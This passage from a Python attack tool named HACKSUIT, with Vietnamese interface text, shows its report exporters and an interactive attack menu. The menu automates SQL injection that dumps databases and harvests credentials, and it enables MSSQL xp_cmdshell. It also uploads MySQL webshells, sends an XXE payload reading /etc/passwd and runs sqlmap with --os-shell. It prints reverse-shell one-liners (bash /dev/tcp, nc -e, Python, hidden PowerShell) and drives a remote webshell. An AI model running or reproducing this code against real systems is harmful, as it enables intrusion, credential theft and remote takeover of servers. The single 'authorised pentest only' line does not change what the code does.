RISK_COLOR = {"CRITICAL":"danger","HIGH":"warning","MEDIUM":"warning","LOW":"info","INFO":"secondary"}

def gen_poc(f):
    """Sinh PoC curl cho finding"""
    url = f.get("url",""); method = f.get("method","GET"); param = f.get("param","")
    payload = f.get("payload","")
    if method == "GET":
        if "?" in url: url2 = url + "&" + param + "=" + quote(str(payload))
        else: url2 = url + "?" + param + "=" + quote(str(payload))
        return f"curl -i -k '{url2}'"
    else:
        return f"curl -i -k -X POST '{url}' -d '{param}={payload}'"

def export_html(e, target=""):
    ensure_dir(REPORT_DIR)
    path = os.path.join(REPORT_DIR, f"report_{int(time.time())}.html")
    findings = sorted(e.findings, key=lambda x: {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
                     .get(SEVERITY.get(x.get("type","info"),"INFO"),5))
    counts = {}
    for f in e.findings:
        s = SEVERITY.get(f.get("type","info"),"INFO"); counts[s] = counts.get(s,0)+1
    rows = ""
    for i, f in enumerate(findings):
        v = f.get("type","info"); sev = SEVERITY.get(v,"INFO"); b = RISK_COLOR.get(sev,"secondary")
        poc = gen_poc(f).replace("<","&lt;").replace(">","&gt;")
        rows += f"""<tr>
<td>{i+1}</td><td><span class="badge bg-{b}">{sev}</span></td>
<td><span class="badge bg-dark">{v}</span></td>
<td><code>{f.get('method','-')}</code></td>
<td style="word-break:break-all">{f.get('url','')[:80]}</td>
<td><code>{f.get('param','-')}</code></td>
<td><code style="font-size:11px">{poc[:180]}</code></td>
</tr>"""
    cnt_html = " ".join(f'<span class="badge bg-{RISK_COLOR.get(s,"secondary")}">{s}: {n}</span>'
                        for s,n in sorted(counts.items()))
    creds_html = ""
    if e.creds:
        creds_html = "<h5>Harvested Credentials</h5><table class='table table-sm'><tr><th>User</th><th>Password</th><th>Source</th></tr>"
        for u,p,src in e.creds[:50]:
            creds_html += f"<tr><td><code>{u}</code></td><td><code>{p}</code></td><td>{src}</td></tr>"
        creds_html += "</table>"
    ai_info = e.ai.summary()
    html = f"""<!DOCTYPE html><html><head><meta charset="utf-8"><title>HACKSUIT v{VERSION}</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<style>body{{background:#0a0e27;color:#eee}}.card{{background:#16213e;border:1px solid #e94560}}.table{{color:#eee}}h1{{color:#e94560}}code{{color:#f39c12}}</style>
</head><body><div class="container py-4">
<h1>⚡ HACKSUIT v{VERSION} — Báo cáo</h1>
<div class="card mb-3"><div class="card-body">
<p><strong>Target:</strong> {target or e.url}</p>
<p><strong>Thời gian:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
<p><strong>WAF:</strong> {e.waf or '—'} | <strong>DBMS:</strong> {e.dbms or '—'} | <strong>Shell:</strong> {e.shell_url or '—'}</p>
<p><strong>AI Profile:</strong> {json.dumps(ai_info, ensure_ascii=False)}</p>
<p><strong>Tổng findings:</strong> {len(e.findings)} &nbsp; {cnt_html}</p>
</div></div>
{('<div class="card mb-3"><div class="card-body">'+creds_html+'</div></div>') if e.creds else ''}
<div class="card mb-3"><div class="card-body table-responsive">
<h5>Findings</h5><table class="table table-striped table-hover">
<thead><tr><th>#</th><th>Mức độ</th><th>Loại</th><th>Method</th><th>URL</th><th>Param</th><th>PoC</th></tr></thead>
<tbody>{rows or '<tr><td colspan=7 class=text-center>Không có</td></tr>'}</tbody></table>
</div></div>
<div class="card"><div class="card-body"><h5>Remediation</h5>
<ul>
<li><b>SQLi:</b> prepared statements, ORM</li>
<li><b>XSS:</b> escape output, CSP</li>
<li><b>LFI/RCE:</b> whitelist path, không gọi shell</li>
<li><b>SSRF:</b> whitelist outbound, block metadata IP</li>
<li><b>Login:</b> rate limiting, MFA, password policy</li>
</ul></div></div>
<p class="text-muted text-center mt-3">HACKSUIT v{VERSION} — chỉ dùng cho pentest có phép</p>
</div></body></html>"""
    with open(path, "w", encoding="utf-8") as fh: fh.write(html)
    log(f"HTML report: {path}", "OK")
    try: webbrowser.open(f"file://{os.path.abspath(path)}")
    except Exception: pass
    return path

def export_json(e):
    path = os.path.join(REPORT_DIR, f"report_{int(time.time())}.json")
    data = {"target": e.url, "waf": e.waf, "dbms": e.dbms, "shell_url": e.shell_url,
            "ai": e.ai.summary(), "creds": e.creds, "findings": e.findings,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")}
    with open(path, "w", encoding="utf-8") as fh: json.dump(data, fh, indent=2, default=str, ensure_ascii=False)
    log(f"JSON: {path}", "OK"); return path

def export_csv(e):
    path = os.path.join(REPORT_DIR, f"report_{int(time.time())}.csv")
    with open(path, "w", newline="", encoding="utf-8") as fh:
        w = csv.writer(fh); w.writerow(["#","Type","Severity","Method","URL","Param","Payload","PoC"])
        for i, x in enumerate(e.findings, 1):
            s = SEVERITY.get(x.get("type","info"),"INFO")
            w.writerow([i, x.get("type"), s, x.get("method"), x.get("url"),
                        x.get("param"), x.get("payload"), gen_poc(x)])
    log(f"CSV: {path}", "OK"); return path


# ================== MENU ==================
engine = None

def banner():
    print(f"""{C['R']}
 ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██╗   ██╗██╗████████╗
 ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██║   ██║██║╚══██╔══╝
 ███████║███████║██║     █████╔╝ ███████╗██║   ██║██║   ██║
 ██╔══██║██╔══██║██║     ██╔═██╗ ╚════██║██║   ██║██║   ██║
 ██║  ██║██║  ██║╚██████╗██║  ██╗███████║╚██████╔╝██║   ██║
 ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝   ╚═╝{C['X']}
      HACKSUIT v{VERSION} — AI-Assisted Autonomous Attack
 SQLi|XSS|LFI|RCE|SSRF|SSTI|NoSQL|CRLF|Login-Auto|Chain|AI
  {'─'*65}""")

def ask_url():
    if not engine.url:
        u = input(f"{C['Y']}URL: {C['X']}").strip()
        if not u: return False
        if not u.startswith(("http://","https://")): u = "http://" + u
        engine.url = u; log(f"Target: {u}", "OK")
    return True

def show_findings():
    if not engine.findings: log("Chưa có findings.", "WARN"); return
    print(f"\n{C['G']}─── FINDINGS ({len(engine.findings)}) ───{C['X']}")
    for i, f in enumerate(engine.findings):
        s = SEVERITY.get(f.get("type","info"),"INFO")
        score = engine.ai.score_finding(f.get("type",""), True, 200, 1000)
        print(f"  [{i:3}] {s:9} [AI:{score:3}] {f.get('type','?'):18} "
              f"{f.get('param','-'):15} {f.get('url','')[:55]}")
    if engine.creds:
        print(f"\n{C['R']}─── CREDENTIALS ({len(engine.creds)}) ───{C['X']}")
        for u, p, src in engine.creds[:20]:
            print(f"  {u}:{p}   [{src}]")

def main():
    global PROXY, COOKIE, AUTH, engine, FAST_MODE
    parser = argparse.ArgumentParser(description=f"HACKSUIT v{VERSION}")
    parser.add_argument("url", nargs="?", default=None)
    parser.add_argument("-c","--cookie")
    parser.add_argument("-p","--proxy")
    parser.add_argument("--auth", help="user:pass")
    parser.add_argument("--slow", action="store_true", help="Slow mode (có delay)")
    parser.add_argument("--resume", action="store_true", help="Load session cũ")
    args = parser.parse_args()
    PROXY, COOKIE = args.proxy, args.cookie
    if args.auth and ":" in args.auth:
        u, p = args.auth.split(":",1); AUTH = (u,p)
    FAST_MODE = not args.slow
    engine = Engine(args.url, cookie=COOKIE)
    if args.resume: engine.load_session()
    banner()
    if FAST_MODE: log("FAST MODE ON (no delay)", "FAST")
    for tool in ["sqlmap","nmap","nikto","hydra"]:
        if not shutil.which(tool): log(f"Thiếu: {tool}", "WARN")

    while True:
        print(f"""
{C['G']}═════════ HACKSUIT v{VERSION} ═════════{C['X']}
 Target: {engine.url or f"{C['Y']}chưa đặt{C['X']}"} | WAF: {engine.waf or '—'} | DBMS: {engine.dbms or '—'}
 Creds: {len(engine.creds)} | Findings: {len(engine.findings)}
─── SETUP ───
 [99] Đổi URL        [2]  Findings         [77] Save/Resume session
─── AI & AUTO ATTACK ───
 [70] 🧠 AI Analysis (fingerprint + score)  [71] ⚔ AUTO ATTACK CHAIN (full)
 [72] Auto Login Attack (creds harvest)     [73] Fast Multi-Scan (all vulns)
 [74] Auto SQLi → dump → shell → RCE        [75] Auto-Exploit login bypass
─── SQLi ───
 [1]  SQLi detect    [3]  Full SQLi exploit  [4]  DB info
 [5]  DBs            [6]  Tables            [7]  Cols
 [8]  Dump 1 table   [50] Dump ALL + harvest creds
 [30] MySQL webshell upload                  [31] MSSQL xp_cmdshell
─── WEB ───
 [13] XSS   [14] LFI   [15] RCE   [27] SSRF   [33] SSTI   [34] NoSQL
 [38] CRLF  [39] Redirect  [28] CSRF  [32] XXE
─── RECON ───
 [16] Dir Fuzz (fast)   [17] Port Scan   [18] Subdomain   [19] CMS
 [42] API Discovery     [43] SSL         [44] WAF detect
─── TOOLS ───
 [20] Nikto  [23] sqlmap FULL   [24] Brute login   [45] RevShell
 [46] Screenshot  [61] Webshell manager
─── REPORT ───
 [29] HTML   [47] JSON   [48] CSV   [26] View reports
 [0]  Thoát""")
        ch = input("Chọn: ").strip()
        need_url = ch in [str(i) for i in [1,3,4,5,6,7,8,13,14,15,16,17,18,19,20,21,22,23,24,25,
                                             27,28,29,30,31,32,33,34,38,39,42,43,44,45,46,50,
                                             55,56,57,58,60,70,71,72,73,74,75,61]]
        if need_url and not ask_url(): continue

        try:
            if ch == "0": engine.save_session(); print("Bye."); sys.exit(0)
            elif ch == "99": engine.url = None; ask_url()
            elif ch == "2": show_findings()
            elif ch == "77":
                if input("(L)oad / (S)ave: ").strip().lower() == "l": engine.load_session()
                else: engine.save_session(); log("Saved", "OK")
            elif ch == "70":
                r = engine.req(engine.url)
                if r:
                    prof = engine.ai.fingerprint(r.headers, r.text)
                    log(f"Profile: {json.dumps(prof, ensure_ascii=False)}", "AI")
                    engine.detect_waf()
                    for f in engine.findings:
                        sc = engine.ai.score_finding(f.get("type",""), True, 200, 1000)
                        log(f"  {f.get('type'):18} AI={sc}", "AI")
            elif ch == "71": auto_attack_chain(engine)
            elif ch == "72": engine.auto_login_attack()
            elif ch == "73": scan_fast(engine)
            elif ch == "74":
                for t in engine.extract_params():
                    res = engine.sqli_detect(t)
                    if res:
                        t.update(res); engine.findings.append(t); engine.dbms = res["dbms"]
                        engine.current = t
                        engine.waf_bypass()
                        if engine.find_union():
                            engine.auto_dump_creds()
                            if engine.dbms == "mysql": engine.auto_webshell()
                        break
            elif ch == "75": engine.auto_login_attack()
            elif ch == "1":
                for t in engine.extract_params():
                    res = engine.sqli_detect(t)
                    if res:
                        t.update(res); engine.findings.append(t)
                        engine.dbms = engine.dbms or res["dbms"]
                        log(f"SQLi: {t['param']} ({res['type']})", "VULN")
            elif ch in ("3","4","5","6","7","8","50","30","31"):
                sqli_f = [f for f in engine.findings if f.get("type","").startswith(("error","boolean","time"))]
                if not sqli_f: log("Chưa có SQLi", "WARN"); continue
                t = sqli_f[0]; engine.current = t
                if ch == "3":
                    r = engine.inject(t,"'"); engine.dbms = engine.detect_dbms(r.text) if r else None
                    engine.waf_bypass()
                    if engine.find_union():
                        log("== DB INFO ==", "VULN")
                        for lbl, ex in zip(["Ver","DB","User","Host"],
                                           ["version()","database()","user()","@@hostname"]):
                            print(f"  {lbl:6}: {engine.uquery(ex) or 'N/A'}")
                elif ch in ("4","5","6","7","8","50"):
                    if engine.ncols is None and not engine.find_union(): continue
                    if ch == "4":
                        for lbl, ex in zip(["Ver","DB","User","Host"],
                                           ["version()","database()","user()","@@hostname"]):
                            print(f"  {lbl:6}: {engine.uquery(ex) or 'N/A'}")
                    elif ch == "5":
                        print(engine.uquery("SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata"))
                    elif ch == "6":
                        print(engine.uquery("SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()"))
                    elif ch == "7":
                        tb = input("Table: ").strip()
                        print(engine.uquery(f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{tb}'"))
                    elif ch == "8":
                        tb = input("Table: ").strip(); cs = input("Cols (csv): ").strip().split(",")
                        engine.sqli_dump(tb, cs)
                    elif ch == "50": engine.auto_dump_creds()
                elif ch == "30": engine.auto_webshell()
                elif ch == "31":
                    cmd = input("Cmd: ").strip() or "whoami"
                    for p in [f"'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;-- -",
                              f"'; EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;-- -",
                              f"'; EXEC xp_cmdshell '{cmd}'-- -"]:
                        r = engine.send(p); time.sleep(0.5)
            elif ch == "13": scan_xss(engine)
            elif ch == "14": scan_lfi(engine)
            elif ch == "15": scan_rce(engine)
            elif ch == "27": scan_ssrf(engine)
            elif ch == "33": scan_ssti(engine)
            elif ch == "34": scan_nosql(engine)
            elif ch == "38": scan_crlf(engine)
            elif ch == "39": scan_redirect(engine)
            elif ch == "28":
                r = engine.req(engine.url)
                if r:
                    for form in BeautifulSoup(r.text,"html.parser").find_all("form"):
                        if not any("token" in (i.get("name") or "").lower() or "csrf" in (i.get("name") or "").lower()
                                   for i in form.find_all("input",{"type":"hidden"})):
                            log(f"CSRF: {form.get('action','')[:60]}", "VULN")
                            engine.findings.append({"url":urljoin(engine.url,form.get("action") or engine.url),
                                                    "param":"-","type":"csrf","method":form.get("method","GET").upper()})
            elif ch == "32":
                log("XXE (manual payloads)", "INFO")
                for pl in ['<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>']:
                    for t in engine.extract_params():
                        if t["method"]=="POST":
                            r = engine.req(t["url"], data=pl, method="POST",
                                           headers={"Content-Type":"application/xml"})
                            if r and "root:x:0:0:" in r.text:
                                log("XXE LFI!", "VULN")
                                engine.findings.append({"url":t["url"],"param":t["param"],
                                                        "type":"xxe","payload":pl,"method":"POST"})
            elif ch == "16": dir_fuzz_fast(engine)
            elif ch == "17":
                h = urlparse(engine.url).netloc.split(":")[0]
                if shutil.which("nmap"):
                    subprocess.run(["nmap","-sV","-T4","--top-ports","500","--open",h])
            elif ch == "18":
                base = ".".join(urlparse(engine.url).netloc.split(":")[0].split(".")[-2:])
                for sub in ["www","mail","admin","api","dev","test","portal","vpn"]:
                    try:
                        ip = socket.gethostbyname(f"{sub}.{base}")
                        log(f"{sub}.{base} → {ip}", "OK")
                    except socket.gaierror: pass
            elif ch == "19":
                r = engine.req(engine.url); h = r.text.lower() if r else ""
                for cms, sig in [("WordPress","wp-content"),("Joomla","joomla"),("Drupal","drupal"),
                                 ("Laravel","laravel"),("Django","csrftoken")]:
                    if sig in h: log(f"CMS: {cms}", "VULN")
            elif ch == "42":
                for ep in ["/api","/api/v1","/swagger","/openapi.json","/graphql",
                           "/actuator","/actuator/heapdump","/health","/metrics"]:
                    r = engine.req(urljoin(engine.url,ep))
                    if r and r.status_code in (200,201,400,401,403,500):
                        log(f"[{r.status_code}] {ep}", "OK")
            elif ch == "43":
                u = urlparse(engine.url)
                if u.scheme=="https":
                    try:
                        ctx = ssl.create_default_context()
                        with socket.create_connection((u.hostname,u.port or 443),timeout=5) as s:
                            with ctx.wrap_socket(s,server_hostname=u.hostname) as ss:
                                cert = ss.getpeercert()
                                log(f"TLS {ss.version()} | Issuer: {dict(x[0] for x in cert['issuer'])}", "OK")
                    except Exception as ex: log(f"SSL err: {ex}", "WARN")
            elif ch == "44": engine.detect_waf()
            elif ch == "20":
                if shutil.which("nikto"):
                    subprocess.run(["nikto","-h",engine.url,"-nointeractive","-Tuning","123456789"])
            elif ch == "23":
                sf = [f for f in engine.findings if f.get("type","").startswith(("error","boolean","time"))]
                if sf and shutil.which("sqlmap"):
                    t = sf[0]
                    cmd = ["sqlmap","-u",t["url"],"--batch","--random-agent","--level=5","--risk=3",
                           "--threads=10","--dbs","--dump-all","--os-shell"]
                    try: subprocess.run(cmd, timeout=3600)
                    except subprocess.TimeoutExpired: log("sqlmap timeout","WARN")
            elif ch == "24":
                pass  # đã tích hợp trong auto_login_attack
            elif ch == "45":
                ip = input("LHOST: ").strip(); port = input("LPORT (4444): ").strip() or "4444"
                shells = [f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
                          f"nc -e /bin/sh {ip} {port}",
                          f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'",
                          f"powershell -NoP -W Hidden -Command \"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);iex $d 2>&1|Out-String|%{{$s.Write([Text.Encoding]::ASCII.GetBytes($_),0,$_.Length)}}}};\""]
                for s in shells: print(s)
            elif ch == "46":
                if shutil.which("wkhtmltoimage"):
                    subprocess.run(["wkhtmltoimage",engine.url,"reports/screen.png"],timeout=30)
                    log("Screenshot saved","OK")
            elif ch == "61":
                url = engine.shell_url or input("Shell URL: ").strip()
                if url:
                    while True:
                        c = input(f"{C['R']}shell>{C['X']} ").strip()
                        if c in ("exit","quit"): break
                        if not c: continue
                        try:
                            r = requests.get(url, params={"c":c,"cmd":c}, timeout=10, verify=False)
                            print(r.text[:2000])
                        except Exception as ex: log(f"{ex}", "WARN")
            elif ch == "29": export_html(engine, target=engine.url)
            elif ch == "47": export_json(engine)
            elif ch == "48": export_csv(engine)
            elif ch == "26":
                for root,_,files in os.walk(REPORT_DIR):
                    for f in files: print(f"  {os.path.join(root,f)}")
            else:
                log("Lựa chọn không hợp lệ.", "WARN")
        except KeyboardInterrupt:
            print(); log("Ctrl+C", "WARN"); continue
        except Exception as ex:
            log(f"Lỗi: {ex}", "WARN")
            import traceback; traceback.print_exc()


if __name__ == "__main__":
    main()